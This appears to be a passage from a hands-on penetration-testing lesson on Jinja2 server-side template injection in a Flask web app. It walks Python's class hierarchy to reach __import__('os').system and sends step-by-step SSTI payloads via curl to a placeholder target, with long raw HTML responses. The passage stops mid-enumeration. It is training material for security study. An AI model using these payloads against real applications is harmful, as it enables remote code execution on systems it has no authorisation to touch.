Noteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\" , '__package__' : '' , '__loader__' : < class ' _frozen_importlib . BuiltinImporter '>, ' __spec__ ': ModuleSpec(name=' builtins ', loader=<class ' _frozen_importlib . BuiltinImporter '>), ' __build_class__ ': <built-in function __build_class__>, ' __import__ ': <built-in function __import__>, ' abs ': <built-in function abs>, ' all ': <built-in function all>, ' any ': <built-in function any>, ' ascii ': <built-in function ascii>, ' bin ': <built-in function bin>, ' breakpoint ': <built-in function breakpoint>, ' callable ': <built-in function callable>, ' chr ': <built-in function chr>, ' compile ': <built-in function compile>, ' delattr ': <built-in function delattr>, ' dir ': <built-in function dir>, ' divmod ': <built-in function divmod>, ' eval ': <built-in function eval>, ' exec ': <built-in function exec>, ' format ': <built-in function format>, ' getattr ': <built-in function getattr>, ' globals ': <built-in function globals>, < SNIP > >>> z = y () . _module . __builtins__ >>> for i in z : ... if i . find ( 'import' ) >- 1 : ... print ( i , z [ i ]) ... __import__ < built - in function __import__ > It seems we have reached the import function by walking the hierarchy. This means we can load os and use the system function to execute code all coming from a string object: >>> '' . __class__ . __mro__ [ 1 ] . __subclasses__ () [ 215 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . system ( 'echo RCE from a string object' ) RCE from a string object 0 Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded. Payload: {{ '' . __class__ }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>&lt;class &#39;str&#39;&gt;</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> Payload: {{ '' . __class__ . __mro__ }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> We are interested in the second item, so the payload should become: {{ '' . __class__ . __mro__ [ 1 ] }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>&lt;class &#39;object&#39;&gt;</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> Start by walking down the hierarchy {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ () }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;zipimport._ZipImportResourceReader&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;_collections._tuplegetter&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;functools.singledispatchmethod&#39;&gt;, &lt;class &#39;functools.cached_property&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;re.Pattern&#39;&gt;, &lt;class &#39;re.Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.State&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;typing._Final&#39;&gt;, &lt;class &#39;typing._Immutable&#39;&gt;, &lt;class &#39;typing.Generic&#39;&gt;, &lt;class &#39;typing._TypingEmpty&#39;&gt;, &lt;class &#39;typing._TypingEllipsis&#39;&gt;, &lt;class &#39;typing.NamedTuple&#39;&gt;, &lt;class &#39;typing.io&#39;&gt;, &lt;class &#39;typing.re&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver._NoThreads&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;_sha512.sha384&#39;&gt;, &lt;class &#39;_sha512.sha512&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;unpack_iterator&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class {{ ''.__class__.__mro__ }} &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#39;&gt;, &lt;class &#39;dataclasses._MISSING_TYPE&#39;&gt;, &lt;class &#39;dataclasses._FIELD_BASE&#39;&gt;, &lt;class &#39;dataclasses.InitVar&#39;&gt;, &lt;class &#39;dataclasses.Field&#39;&gt;, &lt;class &#39;dataclasses._DataclassParams&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.Event&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.MultipartDecoder&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.MultipartEncoder&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.user_agent.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.useragents._UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.sansio.request.Request&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.sansio.response.Response&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContext&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local._ProxyLookup&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.scaffold.Scaffold&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;]</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> Print out the number and the method names using the following payload { % for i in range ( 450 ) % } {{ i }} {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ i ] . __name__ }} { % endfor % } hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a> 0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 